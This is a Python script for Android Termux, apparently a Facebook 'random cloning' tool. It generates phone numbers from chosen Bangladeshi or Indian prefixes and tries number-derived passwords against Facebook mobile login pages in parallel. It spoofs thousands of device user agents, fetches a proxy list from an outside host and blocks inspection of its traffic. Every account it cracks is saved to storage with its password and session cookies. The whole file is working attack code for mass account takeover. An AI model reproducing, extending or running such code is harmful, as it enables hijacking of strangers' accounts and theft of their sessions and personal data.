#SCRIPTS CREATE BY ARIYAN MASUM 
#SCRIPTS IS FULL FIRE BRO
#---------------------● IMPORT ●---------------------#
import os,time,random,string,re,sys,json,uuid,asyncio,platform,subprocess
from concurrent.futures import ThreadPoolExecutor as ThreadPool
try:
	import pycurl
	from io import BytesIO
except:
	os.system('pip install pycurl')
	from io import BytesIO
try:
	import requests
except:
	os.system('pip install requests')
	import requests
#---------------------● LOOP ●---------------------#
ugen=[];uggen=[];id;ok=[];cp=[];loop=0;oks=[];cps=[];lk=[];twf=[];lop=0;xode=[];ckix=[];plist=[];cpx=[];cokix=[];apkx=[];paswtrh = []
#---------------------● COLOUR ●---------------------#
G="\x1b[38;5;46m";W="\x1b[38;5;15m";B="\x1b[38;5;8m";Y="\x1b[38;5;226m";A="\x1b[38;5;123m";R="\x1b[38;5;160m";O="\x1b[38;5;81m";X="\x1b[38;5;205m";P="\033[0;34m"
#---------------------● STYLE ●---------------------#
xd=f"{R}<|{G}●{R}|>{W}";xd1=f"{R}<|{G}1{R}|>{W}";xd2=f"{R}<|{G}2{R}|>{W}";xd3=f"{R}<|{G}3{R}|>{W}";xd4=f"{R}<|{G}4{R}|>{W}";xd5=f"{R}<|{G}5{R}|>{W}";xd6=f"{R}<|{G}6{R}|>{W}";xd0=f"{R}<|{G}0{R}|>{W}";xdx=f"{R}<|{G}?{R}|>{W}";xdxx=f"{R}:{W}"
#---------------------● SDCARD PERMISSION ●---------------------#
try:
	os.mkdir('/sdcard/MASUM')
except:
	pass
if os.path.exists("/sdcard/MASUM"):
	pass
else:
	os.system('termux-setup-storage')
	try:
		os.mkdir('/sdcard/MASUM')
	except:
		pass
	if os.path.exists("/sdcard/MASUM"):
		pass
	else:
		os.system('termux-setup-storage')
		try:
			os.mkdir('/sdcard/MASUM')
		except:
			pass
		if os.path.exists("/sdcard/MASUM"):
			pass
		else:
			print(f"{xd} STORAGE PERMISSION ON PLEASE THEN AGAIN RUN TOOL")
			exit()
#---------------------● SECURITY ●---------------------#
_fbsr_ = f"{xd} TURN OFF YOUR BYPASS SYSTEM"
from requests import api,models,utils,sessions,exceptions,compat,cookies,adapters
XDBL = ['print', 'zlib', 'marshal', 'base64']
XDBLL = ['print', 'zlib', 'marshal', 'base64',"verify = False","verify=False","verify =False","verify= False"]
xxapi = open(api.__file__, 'r').read()
xxmodels = open(models.__file__, 'r').read()
xxutils = open(utils.__file__, 'r').read()
xxsessions = open(sessions.__file__, 'r').read()
xxexceptions = open(exceptions.__file__, 'r').read()
xxcookies = open(cookies.__file__, 'r').read()
xxadapters = open(adapters.__file__, 'r').read()
xxcompat = open(compat.__file__, 'r').read()
if not any(word in xxapi for word in XDBL):
	pass
else:
	exit(_fbsr_)
if not any(word in xxmodels for word in XDBL):
	pass
else:
	exit(_fbsr_)
if not any(word in xxutils for word in XDBL):
	pass
else:
	exit(_fbsr_)
if not any(word in xxsessions for word in XDBLL):
	pass
else:
	exit(_fbsr_)
if not any(word in xxexceptions for word in XDBL):
	pass
else:
	exit(_fbsr_)
if not any(word in xxcookies for word in XDBL):
	pass
else:
	print()
	exit(_fbsr_)
if not any(word in xxadapters for word in XDBL):
	pass
else:
	exit(_fbsr_)
if not any(word in xxcompat for word in XDBL):
	pass
else:
	exit(_fbsr_)
#---------------------● USER AGENT ●---------------------#
for xffd in range(1000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)
for ran in range(1000):
	aa='Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X)'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/15E148 Safari/605.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for MASUM1 in range(1000):
	model=random.choice(["V2232A","V2060","vivo Y97 Build/O11019","vivo Y17 Build/PPR1.180610.011","V1930A Build/PKQ1.190616.001","V2164KA","V1816A Build/PKQ1.180819.001","V2249","V2040","V2030","V2029","vivo 1610 Build/MMB29M","vivo 2018","vivo 1814 Build/O11019","V2244A"])
	ua=f"Mozilla/5.0 (Linux; Android {random.randrange(6,13)}; {model}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randrange(73,100)}.0.{random.randrange(4200,4900)}.{random.randrange(40,150)} Mobile Safari/537.36 VivoBrowser/{random.randrange(6,18)}.{random.randrange(6,10)}.0.{random.randrange(6,10)}"
	ugen.append(ua)
for MASUM2 in range(1000):
	ua=f"Mozilla/5.0 (Linux; Android {random.randrange(6,13)}; STELLAR P6 Build/SP1A.{random.randrange(111111,999999)}.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randrange(73,100)}.0.{random.randrange(4200,4900)}.{random.randrange(40,150)} Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/{str(random.randint(80,500))}.0.0.{str(random.randint(10,100))}.{str(random.randint(60,150))};]"
	ugen.append(ua)
for MASUM3 in range(1000):
	ua=f"Mozilla/5.0 (Linux; Android {random.randrange(6,13)}; Infinix X680B Build/QP1A.{random.randrange(111111,999999)}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randrange(73,100)}.0.{random.randrange(4200,4900)}.{random.randrange(40,150)} Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/{str(random.randint(80,500))}.0.0.{str(random.randint(10,100))}.{str(random.randint(60,150))};]"
	ugen.append(ua)
for MASUM4 in range(1000):
	v=random.randrange(111111,999999)
	fb=random.choice([f"STELLAR P6|SP1A.{v}.016","SHIELD|LMY47N",f"6002A|RP1A.{v}.011",f"AKUS PRO|QP1A.{v}.020","MX-A10R|S00812",f"iT-KSA0012|PPR1.{v}.011",f"Nokia C2|PPR1.{v}.011",f"MT10|TQ1A.{v}.002.A1",f"ZTE A2023PG|SKQ1.{v}.001","iris65|O11019",f"Hisense Infinity H50S 5G|RP1A.{v}.011",f"itel A661WP|RP1A.{v}.001",f"itel A611W|RP1A.{v}.001",f"itel W5008|OPM2.{v}.012","Flare_S7_Mini|O21019","Flare_J2_Max|O21019","BBC100-1|NMF26F",f"itel W5008|OPM2.{v}.012",f"itel A632W|SP1A.{v}.016",f"Hisense V50|RP1A.{v}.001"])
	mdl,bld=fb.split('|')
	ua=f"Mozilla/5.0 (Linux; Android {random.randrange(6,13)}; {mdl} Build/{bld}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randrange(73,200)}.0.{random.randrange(4200,4900)}.{random.randrange(40,200)} Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/{str(random.randint(80,500))}.0.0.{str(random.randint(10,100))}.{str(random.randint(60,150))};]"
	ugen.append(ua)
for MASUM5 in range(1000):
	ua=f"Mozilla/5.0 (iPhone; U; CPU iPhone OS 5_0_1 like Mac OS X; en_US) AppleWebKit (KHTML, like Gecko) Mobile [FBAN/FBForIPhone;FBAV/4.1;FBBV/{random.randrange(1111,4100)}.0;FBDV/iPhone4,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/5.0.1;FBSS/2; FBCR/Three;FBID/phone;FBLC/en_US;FBSF/2.0]"
	ugen.append(ua)
for MASUM6 in range(1000):
	ua=f"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19E258 [FBAN/FBIOS;FBAV/{random.randrange(100,500)}.1.0.{random.randrange(20,100)}.{random.randrange(80,200)};FBBV/{random.randrange(111111111,999999999)};FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/{random.randrange(111111111,999999999)}]"
	ugen.append(ua)
for MASUM7 in range(1000):
	ua=f"Mozilla/5.0 (Linux; Android {random.randrange(6,13)}; CPH1937 Build/PKQ1.{random.randrange(111111,999999)}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randrange(73,100)}.0.{random.randrange(4200,4900)}.{random.randrange(40,150)} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(random.randint(80,500))}.0.0.{str(random.randint(10,100))}.{str(random.randint(60,150))};]"
	ugen.append(ua)
for MASUM8 in range(1000):
	mdl=random.choice(["RMX2155","RMX3085","RMX2151"])
	ua=f"Mozilla/5.0 (Linux; Android {random.randrange(6,13)}; {mdl} Build/QP1A.{random.randrange(111111,999999)}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randrange(73,100)}.0.{random.randrange(4200,4900)}.{random.randrange(40,150)} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(random.randint(80,500))}.0.0.{str(random.randint(10,100))}.{str(random.randint(60,150))};]"
	ugen.append(ua)
for MASUM9 in range(1000):
	mdl=random.choice(['CPH1114','CPH1235','CPH1451','CPH1615','CPH1664','CPH1869','CPH1929','CPH1985','CPH2048','CPH2068','CPH2107','CPH2238','CPH2261','CPH2331','CPH2332','CPH2351','CPH2381','CPH2389','CPH2399','CPH2401','CPH2409','CPH2411','CPH2413','CPH2415','CPH2417','CPH2419','CPH2423','CPH2447','CPH2449','CPH2451','CPH2459','CPH2465','CPH2467','CPH2469','CPH2487','CPH2491','CPH2493','CPH2499','CPH2513','CPH2515','CPH2519','CPH2521','CPH2523','CPH2525','CPH2529','CPH2551','CPH2553','CPH2557','CPH2569','CPH2579','CPH2581','CPH2583','CPH2589','CPH2591','CPH2599','CPH2607','CPH2609','CPH2611','CPH2617','CPH2643','CPH3475','CPH3669','CPH3682','CPH3731','CPH3776','CPH3785','CPH4125','CPH4275','CPH4299','CPH4395','CPH4473','CPH4987','CPH5286','CPH5841','CPH5947','CPH6178','CPH6244','CPH6271','CPH6316','CPH6519','CPH6528','CPH6697','CPH7338','CPH7364','CPH7382','CPH7532','CPH7577','CPH7948','CPH7991','CPH8153','CPH8346','CPH8347','CPH8363','CPH8393','CPH8467','CPH8472','CPH8534','CPH8686','CPH8893','CPH9177','CPH9226','CPH9659','CPH9667','CPH9716','CPH9763','CPH9839','CPH9929','R830','R830S','R833T','R9','R9 Plus','R9km','R9s','R9s Plus','R9t','R9tm','Real','Reno','Reno 10','Reno 10 5G','Reno 10 Pro 5G','Reno 10 Pro+ 5G','Reno 10X','Reno 10X Zoom','Reno 2','Reno 2F','Reno 2Z','Reno 3','Reno 3 5G','Reno 3 Lite','Reno 3 Pro','Reno 3A','Reno 4 4G','Reno 4 5G','Reno 4 Lite','Reno 4 Pro 4G','Reno 4 Pro 5G','Reno 4 SE 5G','Reno 4F','Reno 4Z 5G','Reno 5','Reno 5 5G','Reno 5 Lite','Reno 5 Pro 5G','Reno 5 Pro Plus 5G','Reno 5A','Reno 5F','Reno 5G','Reno 5K','Reno 5K 5G','Reno 5Z','Reno 6','Reno 6 Pro','Reno 6 Pro 5G','Reno 6 Pro Plus','Reno 6 Z 5G','Reno 7','Reno 7 Pro','Reno 7 SE','Reno 7A','Reno 7Z','Reno 8','Reno 8 Pro','Reno 8 Pro+','Reno 8 Z','Reno 8T','Reno 9'])
	ua=f"Mozilla/5.0 (Linux; Android {random.randrange(6,13)}; {mdl} Build/RP1A.{random.randrange(111111,999999)}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randrange(73,100)}.0.{random.randrange(4200,4900)}.{random.randrange(40,150)} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(random.randint(10,100))}.{str(random.randint(60,150))};]"
	ugen.append(ua)
#---------------------● PROXY ●---------------------#
try:
	prox= requests.get('https://raw.githubusercontent.com/tonmoy404-cyber/Server/main/proxy.txt').text
	open('proxy.txt','w').write(proxies)
except Exception as e:pass
proxies=open('proxy.txt','r').read().splitlines()
#---------------------● CLEAR ●---------------------#
def clear():os.system('clear');print(logo)
def linex():print(f'{R}──────────────────────────────────────────────────')
#---------------------● LOGO ●---------------------#
logo=(f"""
   _____ ______    _______   ________
  / ___//  _/ /   / ____/ | / /_  __/
  \__ \ / // /   / __/ /  |/ / / /   
 ___/ // // /___/ /___/ /|  / / /    
/____/___/_____/_____/_/ |_/ /_/     
		                 \033[1;36m[\x1b[38;5;47mKILLER\033[1;36m]
{R}➤{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}➤   
{A}({R}+{A}) {A}DEVLOPER {R}: {A}MD MASUM
{A}({R}+{A}) {A}FACEBOOK {R}: {A}MD MASUM
{A}({R}+{A}) {A}GITHUB   {R}: {A}CYBER-71
{R}➤{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}➤   """)
#---------------------● MENU ●---------------------#
def ___menu___():
	clear()
	print(f'{xd1} BANGLADESH RANDOM CLONING ');print(f'{xd2} INDIA RANDOM CLONING ');linex();MASUMx=input(f'{xdx} SELECT {xdxx} ')
	if MASUMx in ["1"]:___Bangladesh___()
	if MASUMx in ["2"]:___India___()
	else:exit()
#---------------------● BANGLADESH ●---------------------#
def ___Bangladesh___():
	clear();print(f'{xd} EXAMPLE {xdxx} 017 {R}|{W} 018 {R}|{W} 019 {R}|{W} 016');linex();code = input(f'{xdx} SELECT  {xdxx} ')
	clear();print(f'{xd} EXAMPLE {xdxx} 3000 {R}|{W} 5000 {R}|{W} 9999 {R}|{W} 99999');linex()
	try:
		limit = int(input(f'{xdx} SELECT  {xdxx} '+G))
	except:
		limit = 5000
	clear();print(f'{xd1} METHOD R1 ');print(f'{xd2} METHOD R2 ');print(f'{xd3} METHOD R3 ');print(f'{xd4} METHOD R4 ');print(f'{xd5} METHOD R5 ');linex();methdx = input(f'{xdx} SELECT {xdxx} ')
	if methdx in ["1"]:xrl="m.facebook.com"
	elif methdx in ["2"]:xrl="x.facebook.com"
	elif methdx in ["3"]:xrl="p.facebook.com"
	elif methdx in ["4"]:xrl="touch.facebook.com"
	elif methdx in ["5"]:xrl="free.facebook.com"
	else:xrl="mbasic.facebook.com"
	for number in range(limit):
		numberx = ''.join(random.choice(string.digits) for _ in range(8))
		xode.append(numberx)
	with ThreadPool(max_workers=30) as MASUMxd:
		clear();tid= str(len(xode))
		print(f'{xd} SIM CODE  {xdxx} {code}');print(f'{xd} TOTAL UID {xdxx} {tid}');print(f'{xd} FLIGHT MODE ON{R}|{W}OFF EVERY 3 MINUTES');linex()
		for rngx in xode:
			id=code+rngx
			psd=[id,rngx,id[5:],id[4:],id[:7]]
			MASUMxd.submit(__XD__,id,psd,tid,xrl)
#---------------------● INDIA ●---------------------#
def ___India___():
	clear();print(f'{xd} EXAMPLE {xdxx} +91639 {R}|{W} +91699 {R}|{W} +91644 {R}|{W} +91677');linex();code = input(f'{xdx} SELECT  {xdxx} ')
	clear();print(f'{xd} EXAMPLE {xdxx} 3000 {R}|{W} 5000 {R}|{W} 9999 {R}|{W} 99999');linex()
	try:
		limit = int(input(f'{xdx} SELECT  {xdxx} '+G))
	except:
		limit = 5000
	clear();print(f'{xd1} METHOD R1 ');print(f'{xd2} METHOD R2 ');print(f'{xd3} METHOD R3 ');print(f'{xd4} METHOD R4 ');print(f'{xd5} METHOD R5 ');linex();methdx = input(f'{xdx} SELECT {xdxx} ')
	if methdx in ["1"]:xrl="m.facebook.com"
	elif methdx in ["2"]:xrl="x.facebook.com"
	elif methdx in ["3"]:xrl="p.facebook.com"
	elif methdx in ["4"]:xrl="touch.facebook.com"
	elif methdx in ["5"]:xrl="free.facebook.com"
	else:xrl="mbasic.facebook.com"
	for number in range(limit):
		numberx = ''.join(random.choice(string.digits) for _ in range(7))
		xode.append(numberx)
	with ThreadPool(max_workers=30) as MASUMxd:
		clear();tid= str(len(xode))
		print(f'{xd} SIM CODE  {xdxx} {code}');print(f'{xd} TOTAL UID {xdxx} {tid}');print(f'{xd} FLIGHT MODE ON{R}|{W}OFF EVERY 3 MINUTES');linex()
		for rngx in xode:
			id=code+rngx
			psd=[rngx,id[:8],'57273200','59039200']
			MASUMxd.submit(__XD__,id,psd,tid,xrl)
#---------------------● LOCK REMOVER ●---------------------#
def lock_chaker(iid):
	req = str(requests.get(f'https://graph.facebook.com/{iid}/picture?type=normal').text)
	if 'Photoshop' in req:
		return 'Active'
	else:
		return 'Locked'
#---------------------● METHOD ●---------------------#
def __XD__(id,psd,tid,xrl):
	global ok,cp,lop
	session = requests.Session()
	ua=random.choice(ugen)
	sys.stdout.write(f'\r\r{R}<|{W}MASUM-XD{R}|> {R}|{W}%s{R}|{G}%s{R}|{O}%s{R}|{X}%s{R}| '%(lop,len(ok),len(lk),len(cp)));sys.stdout.flush()
	try:
		for psw in psd:
			model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
			mytd=xrl
			ffb = session.get(f'https://'+mytd).text
			datax={"lsd":re.search('name="lsd" value="(.*?)"', str(ffb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(ffb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(ffb)).group(1),"li":re.search('name="li" value="(.*?)"', str(ffb)).group(1),"try_number":"0","unrecognized_tries":"0","email":id,"pass":psw,"login":"Log In"}
			header={'authority': mytd,'method': 'GET','path': '/','scheme': 'https','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,as-IN;q=0.6,as;q=0.5','cache-control': 'max-age=0','dpr': '1.600000023841858','sec-ch-prefers-color-scheme': 'dark','sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"','sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"','sec-ch-ua-mobile': '?1','sec-ch-ua-model': model,'sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"11.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua,'viewport-width': '980',}
			lo = session.post(f'https://{mytd}/login/device-based/regular/login/?refsrc',data=datax,headers=header).text
			lcki=session.cookies.get_dict().keys()
			if 'c_user' in lcki:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				try:
					iid=re.findall('c_user=(.*);xs', coki)[0]
				except:
					iid=id
				check = lock_chaker(iid)
				if 'Locked' in check:
					print(f"\r\r\x1b[38;5;81m<|MASUM-LK|> {iid} | {psw}\x1b[1;97m")
					lk.append(id)
					open('/sdcard/MASUM/MASUM-RAMDOM-LOCK.txt', 'a').write(iid+'|'+psw+'|'+coki+"\n")
					break
				else:
					print(f"\r\r\x1b[38;5;46m<|MASUM-OK|> {iid} | {psw}\x1b[0m")
					print(f"\r\r\x1b[38;5;46m<|●|> "+coki+"\n")
					ok.append(id)
					open('/sdcard/MASUM/MASUM-RAMDOM-OK.txt', 'a').write(iid+'|'+psw+'|'+coki+"\n")
					break
				break
			elif 'checkpoint' in lcki:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cke=coki.split('checkpoint=%7B%22u%22%3A')[1][:3]
				try:
					if cke in "615":
						iid=coki.split('checkpoint=%7B%22u%22%3A')[1][:14]
					else:
						iid=coki.split('checkpoint=%7B%22u%22%3A')[1][:15]
				except:
					iid=id
				cp.append(id)
				open('/sdcard/MASUM/MASUM-RANDOM-CP.txt', 'a').write(iid+'|'+psw+"\n")
				break
			else:
				continue
		lop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)

___menu___()